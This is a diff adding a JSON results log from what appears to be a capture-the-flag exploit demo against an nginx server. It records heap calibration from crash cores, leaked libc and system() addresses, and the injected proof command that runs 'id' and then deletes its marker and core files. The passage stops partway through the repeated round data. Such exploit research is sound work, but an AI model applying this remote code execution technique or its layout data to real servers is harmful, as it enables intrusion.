@@ -1,0 +1,1909 @@
+{
+  "argv": [
+    "./demo_ctf_exploit_v1_6.py",
+    "--host",
+    "192.168.1.205",
+    "--port",
+    "19321",
+    "--fast",
+    "--no-color",
+    "--require-reset-core",
+    "--rounds",
+    "2",
+    "--exec-cmd",
+    "id",
+    "--cleanup-delay",
+    "30",
+    "--cleanup-core",
+    "--artifact-dir",
+    "artifacts"
+  ],
+  "artifact_path": "artifacts/demo_v1_6_20260515-053037.json",
+  "binary_fingerprints": {
+    "libc": {
+      "build_id": "095c7ba148aeca81668091f718047078d57efddb",
+      "bytes_read": 2220400,
+      "path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "sha256": "c53819710b163d3f1d2541778590d58d3ef31cb0ed75adcbe059faac68c1e72d"
+    },
+    "nginx": {
+      "build_id": "060e053ab1fa1a2876b7fe0ff4eff0cc777857b6",
+      "bytes_read": 5583848,
+      "path": "/nginx-src/build/nginx",
+      "sha256": "14bebe8937678598b8ebb8449f8c155478a4c49894c9467ce51d54a79352f08f"
+    }
+  },
+  "calibration_attempts": [
+    {
+      "cleanup_pool_count": 2,
+      "core_pids": [
+        2912
+      ],
+      "crashed": true,
+      "expected_worker_pid": 2912,
+      "geometry": {
+        "a_count": 127,
+        "plus_count": 962
+      },
+      "geometry_index": 1,
+      "matches": [
+        {
+          "hit": {
+            "addr": "0x55a491955627",
+            "slot_offset": 80
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a49195562f",
+            "slot_offset": 88
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491955637",
+            "slot_offset": 96
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491955647",
+            "slot_offset": 112
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a49195564f",
+            "slot_offset": 120
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491955657",
+            "slot_offset": 128
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a49195565f",
+            "slot_offset": 136
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491955667",
+            "slot_offset": 144
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a49195566f",
+            "slot_offset": 152
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491955677",
+            "slot_offset": 160
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491952127",
+            "slot_offset": 320
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a49195212f",
+            "slot_offset": 328
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491952137",
+            "slot_offset": 336
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491955727",
+            "slot_offset": 336
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a49195572f",
+            "slot_offset": 344
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491952147",
+            "slot_offset": 352
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491955737",
+            "slot_offset": 352
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a49195214f",
+            "slot_offset": 360
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491952157",
+            "slot_offset": 368
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        },
+        {
+          "hit": {
+            "addr": "0x55a491955747",
+            "slot_offset": 368
+          },
+          "pool": {
+            "addr": "0x55a49195f190",
+            "cleanup": "0x55a491953030",
+            "end": "0x4232254232254232",
+            "last": "0x2542322542322542"
+          }
+        }
+      ],
+      "nonce": "3b3fe98c3f49",
+      "pid_match": true,
+      "probe_cleanup_pool_count": 1,
+      "round": 1,
+      "safe_slot_count": 1028,
+      "unsafe_slot_count": 9409
+    }
+  ],
+  "completed_at": "2026-05-15T03:30:44+00:00",
+  "final_candidate_filter": {
+    "dropped": [
+      {
+        "addr": "0x55a491952e47",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3680
+      },
+      {
+        "addr": "0x55a491956437",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3680
+      },
+      {
+        "addr": "0x55a491952e4f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3688
+      },
+      {
+        "addr": "0x55a491952e57",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3696
+      },
+      {
+        "addr": "0x55a491956447",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3696
+      },
+      {
+        "addr": "0x55a491952e5f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3704
+      },
+      {
+        "addr": "0x55a49195644f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3704
+      },
+      {
+        "addr": "0x55a491952e67",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3712
+      },
+      {
+        "addr": "0x55a491956457",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3712
+      },
+      {
+        "addr": "0x55a491952e6f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3720
+      },
+      {
+        "addr": "0x55a49195645f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3720
+      },
+      {
+        "addr": "0x55a491952e77",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3728
+      },
+      {
+        "addr": "0x55a491956467",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3728
+      },
+      {
+        "addr": "0x55a49195646f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3736
+      },
+      {
+        "addr": "0x55a491956477",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3744
+      },
+      {
+        "addr": "0x55a491952f27",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3904
+      },
+      {
+        "addr": "0x55a491952f2f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3912
+      },
+      {
+        "addr": "0x55a491952f37",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3920
+      },
+      {
+        "addr": "0x55a491956527",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3920
+      },
+      {
+        "addr": "0x55a49195652f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3928
+      },
+      {
+        "addr": "0x55a491952f47",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3936
+      },
+      {
+        "addr": "0x55a491956537",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3936
+      },
+      {
+        "addr": "0x55a491952f4f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3944
+      },
+      {
+        "addr": "0x55a491952f57",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3952
+      },
+      {
+        "addr": "0x55a491956547",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3952
+      },
+      {
+        "addr": "0x55a491952f5f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3960
+      },
+      {
+        "addr": "0x55a49195654f",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3960
+      },
+      {
+        "addr": "0x55a491952f67",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3968
+      },
+      {
+        "addr": "0x55a491956557",
+        "reason": "command does not fit at body offset",
+        "slot_offset": 3968
+      }
+    ],
+    "dropped_count": 29,
+    "kept_count": 195,
+    "payload_size": 328
+  },
+  "final_target_facts": {
+    "heap_ranges": [
+      [
+        "0x55a49189a000",
+        "0x55a4918ff000"
+      ],
+      [
+        "0x55a4918ff000",
+        "0x55a491940000"
+      ]
+    ],
+    "legacy_safe_candidates": 3,
+    "libc_base": "0x7f916f48e000",
+    "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+    "nginx_path": "/nginx-src/build/nginx",
+    "nginx_rw_base": "0x55a48fa75000",
+    "system_addr": "0x7f916f4ded70",
+    "system_offset": "0x50d70",
+    "worker_pid": 2914,
+    "worker_uid": 65534
+  },
+  "git": {
+    "branch": "ctf-remote-aslr-lfi",
+    "commit": "ff9eb96",
+    "dirty": true
+  },
+  "initial_target_facts": {
+    "heap_ranges": [
+      [
+        "0x55a49189a000",
+        "0x55a4918ff000"
+      ],
+      [
+        "0x55a4918ff000",
+        "0x55a491928000"
+      ]
+    ],
+    "legacy_safe_candidates": 3,
+    "libc_base": "0x7f916f48e000",
+    "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+    "nginx_path": "/nginx-src/build/nginx",
+    "nginx_rw_base": "0x55a48fa75000",
+    "system_addr": "0x7f916f4ded70",
+    "system_offset": "0x50d70",
+    "worker_pid": 2912,
+    "worker_uid": 65534
+  },
+  "layout_checks": {
+    "initial_to_final": [
+      {
+        "after": "0x55a48fa75000",
+        "before": "0x55a48fa75000",
+        "description": "nginx writable map",
+        "field": "nginx_rw_base",
+        "ok": true
+      },
+      {
+        "after": "/nginx-src/build/nginx",
+        "before": "/nginx-src/build/nginx",
+        "description": "nginx path",
+        "field": "nginx_path",
+        "ok": true
+      },
+      {
+        "after": "0x7f916f48e000",
+        "before": "0x7f916f48e000",
+        "description": "libc base",
+        "field": "libc_base",
+        "ok": true
+      },
+      {
+        "after": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+        "before": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+        "description": "libc path",
+        "field": "libc_path",
+        "ok": true
+      },
+      {
+        "after": "0x50d70",
+        "before": "0x50d70",
+        "description": "system offset",
+        "field": "system_offset",
+        "ok": true
+      },
+      {
+        "after": "0x7f916f4ded70",
+        "before": "0x7f916f4ded70",
+        "description": "system address",
+        "field": "system_addr",
+        "ok": true
+      },
+      {
+        "after": [
+          [
+            "0x55a49189a000",
+            "0x55a4918ff000"
+          ],
+          [
+            "0x55a4918ff000",
+            "0x55a491940000"
+          ]
+        ],
+        "before": [
+          [
+            "0x55a49189a000",
+            "0x55a4918ff000"
+          ],
+          [
+            "0x55a4918ff000",
+            "0x55a491928000"
+          ]
+        ],
+        "description": "heap ranges present",
+        "field": "heap_ranges_present",
+        "ok": true
+      }
+    ],
+    "pre_reset_to_final": [
+      {
+        "after": "0x55a48fa75000",
+        "before": "0x55a48fa75000",
+        "description": "nginx writable map",
+        "field": "nginx_rw_base",
+        "ok": true
+      },
+      {
+        "after": "/nginx-src/build/nginx",
+        "before": "/nginx-src/build/nginx",
+        "description": "nginx path",
+        "field": "nginx_path",
+        "ok": true
+      },
+      {
+        "after": "0x7f916f48e000",
+        "before": "0x7f916f48e000",
+        "description": "libc base",
+        "field": "libc_base",
+        "ok": true
+      },
+      {
+        "after": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+        "before": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+        "description": "libc path",
+        "field": "libc_path",
+        "ok": true
+      },
+      {
+        "after": "0x50d70",
+        "before": "0x50d70",
+        "description": "system offset",
+        "field": "system_offset",
+        "ok": true
+      },
+      {
+        "after": "0x7f916f4ded70",
+        "before": "0x7f916f4ded70",
+        "description": "system address",
+        "field": "system_addr",
+        "ok": true
+      },
+      {
+        "after": [
+          [
+            "0x55a49189a000",
+            "0x55a4918ff000"
+          ],
+          [
+            "0x55a4918ff000",
+            "0x55a491940000"
+          ]
+        ],
+        "before": [
+          [
+            "0x55a49189a000",
+            "0x55a4918ff000"
+          ],
+          [
+            "0x55a4918ff000",
+            "0x55a491940000"
+          ]
+        ],
+        "description": "heap ranges present",
+        "field": "heap_ranges_present",
+        "ok": true
+      }
+    ]
+  },
+  "pre_existing_marker": {
+    "contains_current_token": false,
+    "exists": false,
+    "path": "/tmp/nginx_rift_demo_v1_6_246468e701a7",
+    "size": 0
+  },
+  "preflight": {
+    "boot_id": "3c4fc88e-428c-4d1a-8be7-eb1faf2cd0d7",
+    "config_checks": {
+      "same-port HTTP/2 listener": true,
+      "tuned connection pool": true,
+      "tuned request pool": true,
+      "vulnerable set prefix": true
+    },
+    "config_sha256": "22026f67f6a7d025dfd8111fe9189fdfd312ffe9f040a4d845aa50683e334532",
+    "core_pattern": "core",
+    "http1_alive": true,
+    "http2_probe_bytes": 49,
+    "master_pid": 2909,
+    "os_release": "Ubuntu 22.04.3 LTS",
+    "proc_version": "Linux version 5.15.0-84-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023",
+    "randomize_va_space": "2",
+    "strict_failures": [],
+    "strict_preflight": true,
+    "suid_dumpable": "2",
+    "worker_children": [
+      2912
+    ],
+    "worker_mode": "single"
+  },
+  "proof": {
+    "cleanup_core": true,
+    "cleanup_delay": 30.0,
+    "cmd": "umask 077; sh -c id > /tmp/nginx_rift_demo_v1_6_246468e701a7 2>&1; rc=$?; printf '\\n__NGINX_RIFT_TOKEN__=%s\\n__NGINX_RIFT_RC__=%s\\n' 444759c49715ce004fe00a9a25d38e0e \"$rc\" >> /tmp/nginx_rift_demo_v1_6_246468e701a7; (sleep 30; rm -f /tmp/nginx_rift_demo_v1_6_246468e701a7 /app/tmp/core) >/dev/null 2>&1 &",
+    "exec_cmd": "id",
+    "marker_path": "/tmp/nginx_rift_demo_v1_6_246468e701a7",
+    "mode": "exec",
+    "token": "444759c49715ce004fe00a9a25d38e0e"
+  },
+  "reset_core": {
+    "cleanup_pool_count": 1,
+    "core_pids": [
+      2913
+    ],
+    "crashed": true,
+    "expected_worker_pid": 2913,
+    "geometry": {
+      "a_count": 127,
+      "plus_count": 962
+    },
+    "matches": [
+      {
+        "hit": {
+          "addr": "0x55a491955627",
+          "slot_offset": 80
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a49195562f",
+          "slot_offset": 88
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491955637",
+          "slot_offset": 96
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491955647",
+          "slot_offset": 112
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a49195564f",
+          "slot_offset": 120
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491955657",
+          "slot_offset": 128
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a49195565f",
+          "slot_offset": 136
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491955667",
+          "slot_offset": 144
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a49195566f",
+          "slot_offset": 152
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491955677",
+          "slot_offset": 160
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491952127",
+          "slot_offset": 320
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a49195212f",
+          "slot_offset": 328
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491952137",
+          "slot_offset": 336
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491955727",
+          "slot_offset": 336
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a49195572f",
+          "slot_offset": 344
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491952147",
+          "slot_offset": 352
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491955737",
+          "slot_offset": 352
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a49195214f",
+          "slot_offset": 360
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491952157",
+          "slot_offset": 368
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      },
+      {
+        "hit": {
+          "addr": "0x55a491955747",
+          "slot_offset": 368
+        },
+        "pool": {
+          "addr": "0x55a49195f190",
+          "cleanup": "0x55a491953030",
+          "end": "0x4232254232254232",
+          "last": "0x2542322542322542"
+        }
+      }
+    ],
+    "nonce": "3b3fe98c3f49",
+    "pid_match": true,
+    "probe_cleanup_pool_count": 1,
+    "safe_slot_count": 1028,
+    "unsafe_slot_count": 9409
+  },
+  "rounds": [
+    {
+      "calibration_attempts": [
+        {
+          "cleanup_pool_count": 2,
+          "core_pids": [
+            2912
+          ],
+          "crashed": true,
+          "expected_worker_pid": 2912,
+          "geometry": {
+            "a_count": 127,
+            "plus_count": 962
+          },
+          "geometry_index": 1,
+          "matches": [
+            {
+              "hit": {
+                "addr": "0x55a491955627",
+                "slot_offset": 80
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a49195562f",
+                "slot_offset": 88
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491955637",
+                "slot_offset": 96
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491955647",
+                "slot_offset": 112
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a49195564f",
+                "slot_offset": 120
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491955657",
+                "slot_offset": 128
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a49195565f",
+                "slot_offset": 136
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491955667",
+                "slot_offset": 144
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a49195566f",
+                "slot_offset": 152
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491955677",
+                "slot_offset": 160
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491952127",
+                "slot_offset": 320
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a49195212f",
+                "slot_offset": 328
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491952137",
+                "slot_offset": 336
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491955727",
+                "slot_offset": 336
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a49195572f",
+                "slot_offset": 344
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491952147",
+                "slot_offset": 352
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491955737",
+                "slot_offset": 352
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a49195214f",
+                "slot_offset": 360
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491952157",
+                "slot_offset": 368
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            },
+            {
+              "hit": {
+                "addr": "0x55a491955747",
+                "slot_offset": 368
+              },
+              "pool": {
+                "addr": "0x55a49195f190",
+                "cleanup": "0x55a491953030",
+                "end": "0x4232254232254232",
+                "last": "0x2542322542322542"
+              }
+            }
+          ],
+          "nonce": "3b3fe98c3f49",
+          "pid_match": true,
+          "probe_cleanup_pool_count": 1,
+          "round": 1,
+          "safe_slot_count": 1028,
+          "unsafe_slot_count": 9409
+        }
+      ],
+      "completed_at": "2026-05-15T03:30:44+00:00",
+      "final_candidate_filter": {
+        "dropped": [
+          {
+            "addr": "0x55a491952e47",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3680
+          },
+          {
+            "addr": "0x55a491956437",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3680
+          },
+          {
+            "addr": "0x55a491952e4f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3688
+          },
+          {
+            "addr": "0x55a491952e57",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3696
+          },
+          {
+            "addr": "0x55a491956447",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3696
+          },
+          {
+            "addr": "0x55a491952e5f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3704
+          },
+          {
+            "addr": "0x55a49195644f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3704
+          },
+          {
+            "addr": "0x55a491952e67",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3712
+          },
+          {
+            "addr": "0x55a491956457",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3712
+          },
+          {
+            "addr": "0x55a491952e6f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3720
+          },
+          {
+            "addr": "0x55a49195645f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3720
+          },
+          {
+            "addr": "0x55a491952e77",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3728
+          },
+          {
+            "addr": "0x55a491956467",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3728
+          },
+          {
+            "addr": "0x55a49195646f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3736
+          },
+          {
+            "addr": "0x55a491956477",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3744
+          },
+          {
+            "addr": "0x55a491952f27",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3904
+          },
+          {
+            "addr": "0x55a491952f2f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3912
+          },
+          {
+            "addr": "0x55a491952f37",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3920
+          },
+          {
+            "addr": "0x55a491956527",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3920
+          },
+          {
+            "addr": "0x55a49195652f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3928
+          },
+          {
+            "addr": "0x55a491952f47",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3936
+          },
+          {
+            "addr": "0x55a491956537",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3936
+          },
+          {
+            "addr": "0x55a491952f4f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3944
+          },
+          {
+            "addr": "0x55a491952f57",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3952
+          },
+          {
